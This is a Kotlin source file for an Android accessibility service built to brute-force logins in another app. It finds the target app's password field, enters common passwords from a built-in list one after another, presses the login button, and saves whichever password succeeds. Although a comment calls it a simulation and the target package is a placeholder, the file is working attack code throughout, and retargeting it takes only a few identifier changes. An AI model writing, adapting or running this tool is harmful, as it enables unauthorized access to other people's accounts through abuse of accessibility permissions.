package com.example.bruteforceapp

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.SharedPreferences
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class BruteForceAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "BruteForceAccessibility"
        private const val TARGET_PACKAGE = "com.example.loginapp"
        private const val PASSWORD_FIELD_ID = "com.example.loginapp:id/password"
        private const val LOGIN_RESULT_ID = "com.example.loginapp:id/loginResult"
        private const val ATTACK_DELAY_MS = 2000L // 2 seconds between attempts
    }

    private lateinit var sharedPrefs: SharedPreferences
    private val handler = Handler(Looper.getMainLooper())
    private var attackRunnable: Runnable? = null
    private var attemptCount = 0
    private var isAttackActive = false

    // Common passwords for brute force simulation
    private val passwordList = listOf(
        "123456", "password", "123456789", "12345678", "12345",
        "1234567", "1234567890", "qwerty", "abc123", "111111",
        "123123", "admin", "letmein", "welcome", "monkey",
        "password123", "dragon", "master", "shadow", "superman"
    )

    private var currentPasswordIndex = 0

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "AccessibilityService connected")

        sharedPrefs = getSharedPreferences("attack_control", Context.MODE_PRIVATE)

        // Listen for attack control changes
        startMonitoringAttackState()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || !isAttackActive) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (event.packageName == TARGET_PACKAGE) {
                    Log.d(TAG, "Target app window detected")
                    handleWindowStateChanged()
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (event.packageName == TARGET_PACKAGE) {
                    checkLoginResult()
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "AccessibilityService interrupted")
        stopAttack()
    }

    private fun startMonitoringAttackState() {
        val monitoringRunnable = object : Runnable {
            override fun run() {
                val shouldAttack = sharedPrefs.getBoolean("attack_active", false)

                if (shouldAttack && !isAttackActive) {
                    startAttack()
                } else if (!shouldAttack && isAttackActive) {
                    stopAttack()
                }

                // Check again in 1 second
                handler.postDelayed(this, 1000)
            }
        }
        handler.post(monitoringRunnable)
    }

    private fun startAttack() {
        Log.d(TAG, "Starting brute force attack")
        isAttackActive = true
        attemptCount = 0
        currentPasswordIndex = 0

        // Start the attack sequence
        scheduleNextAttempt()
    }

    private fun stopAttack() {
        Log.d(TAG, "Stopping brute force attack")
        isAttackActive = false
        attackRunnable?.let { handler.removeCallbacks(it) }
        attackRunnable = null
    }

    private fun handleWindowStateChanged() {
        if (!isAttackActive) return

        // When target app window changes, attempt login
        performLoginAttempt()
    }

    private fun scheduleNextAttempt() {
        if (!isAttackActive || currentPasswordIndex >= passwordList.size) {
            Log.d(TAG, "Attack completed or stopped. Attempts: $attemptCount")
            stopAttack()
            return
        }

        attackRunnable = Runnable {
            performLoginAttempt()
        }

        handler.postDelayed(attackRunnable!!, ATTACK_DELAY_MS)
    }

    private fun performLoginAttempt() {
        if (!isAttackActive) return

        val rootNode = rootInActiveWindow ?: return

        try {
            // Find password field
            val passwordField = findNodeById(rootNode, PASSWORD_FIELD_ID)
            if (passwordField == null) {
                Log.w(TAG, "Password field not found")
                scheduleNextAttempt()
                return
            }

            // Get current password to try
            val currentPassword = passwordList[currentPasswordIndex]
            Log.d(TAG, "Attempting login with password: $currentPassword")

            // Clear and input password
            val arguments = Bundle()
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, currentPassword)
            passwordField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)

            // Find and click login button
            handler.postDelayed({
                clickLoginButton(rootNode)
            }, 500) // Small delay to ensure text is set

            attemptCount++
            currentPasswordIndex++

            // Update attempt count in shared preferences for UI
            sharedPrefs.edit().putInt("attempt_count", attemptCount).apply()

            // Schedule next attempt
            scheduleNextAttempt()

        } catch (e: Exception) {
            Log.e(TAG, "Error during login attempt", e)
            scheduleNextAttempt()
        } finally {
            rootNode.recycle()
        }
    }

    private fun clickLoginButton(rootNode: AccessibilityNodeInfo) {
        // Try to find button by text "Login"
        val loginButton = findNodeByText(rootNode, "Login")
            ?: findNodeByText(rootNode, "LOG IN")
            ?: findNodeByText(rootNode, "Sign In")

        if (loginButton != null) {
            loginButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            Log.d(TAG, "Login button clicked")
        } else {
            Log.w(TAG, "Login button not found")
        }
    }

    private fun checkLoginResult() {
        if (!isAttackActive) return

        val rootNode = rootInActiveWindow ?: return

        try {
            val resultField = findNodeById(rootNode, LOGIN_RESULT_ID)
            if (resultField != null) {
                val resultText = resultField.text?.toString()
                Log.d(TAG, "Login result: $resultText")

                if (resultText != null && resultText.contains("Success", ignoreCase = true)) {
                    Log.i(TAG, "SUCCESS! Login successful with password: ${passwordList[currentPasswordIndex - 1]}")
                    stopAttack()

                    // Update shared preferences to notify UI
                    sharedPrefs.edit()
                        .putBoolean("attack_successful", true)
                        .putString("successful_password", passwordList[currentPasswordIndex - 1])
                        .apply()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking login result", e)
        } finally {
            rootNode.recycle()
        }
    }

    private fun findNodeById(rootNode: AccessibilityNodeInfo, targetId: String): AccessibilityNodeInfo? {
        if (rootNode.viewIdResourceName == targetId) {
            return rootNode
        }

        for (i in 0 until rootNode.childCount) {
            val child = rootNode.getChild(i) ?: continue
            val found = findNodeById(child, targetId)
            if (found != null) {
                return found
            }
            child.recycle()
        }

        return null
    }

    private fun findNodeByText(rootNode: AccessibilityNodeInfo, targetText: String): AccessibilityNodeInfo? {
        val text = rootNode.text?.toString()
        if (text != null && text.equals(targetText, ignoreCase = true)) {
            return rootNode
        }

        // Also check content description
        val contentDesc = rootNode.contentDescription?.toString()
        if (contentDesc != null && contentDesc.equals(targetText, ignoreCase = true)) {
            return rootNode
        }

        for (i in 0 until rootNode.childCount) {
            val child = rootNode.getChild(i) ?: continue
            val found = findNodeByText(child, targetText)
            if (found != null) {
                return found
            }
            child.recycle()
        }

        return null
    }
}